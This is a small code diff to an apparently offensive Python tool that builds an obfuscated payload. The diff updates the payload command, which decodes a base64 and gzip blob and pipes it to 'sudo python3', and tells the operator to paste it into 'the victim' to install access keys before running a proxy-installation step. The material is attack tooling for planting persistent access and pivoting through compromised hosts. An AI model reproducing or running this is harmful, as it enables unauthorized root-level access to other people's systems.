@@ -88,14 +88,14 @@ def main():
 
     SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
     gzbased = gzbase(SCRIPT)
-    cmd = "echo %s | base64 -d | gzip -d | sudo python" % gzbased.decode("ascii")
+    cmd = "echo %s | base64 -d | gzip -d | sudo python3" % gzbased.decode("ascii")
     print("[+] paste the following into the victim as the user to install the keys to")
     print(cmd)
     f = tempfile.NamedTemporaryFile(delete=False)
     f.write(cmd.encode("ascii"))
     print("[+] This is also available to you in the file %s" % f.name)
     print("[*] Once this command is ran on sketch as the user to install the keys to, run install_proxy.py "
-          "<Proxyport> <Middle> <Edge> <User> <Key>")
+          "<proxy_port> <middle_name> <middle_ip> <edge_name> <edge_ip> <user> <key>")
 
 
 if __name__ == "__main__":
